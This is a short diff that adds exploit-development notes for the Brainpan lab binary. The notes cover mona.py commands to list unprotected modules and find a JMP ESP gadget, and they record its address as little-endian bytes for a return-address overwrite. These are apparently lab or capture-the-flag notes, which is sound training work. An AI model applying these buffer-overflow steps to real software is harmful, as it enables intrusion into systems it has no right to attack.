@@ -1,0 +1,9 @@
+# Find modules without mem protection
+!mona modules
+
+# Find JMP ESP in module without mem protection
+!mona find -s ‘\xff\xe4’ -m brainpan.exe
+
+# convert to BE
+## 311712F3   . FFE4           JMP ESP
+## \xf3\x12\x17\x31
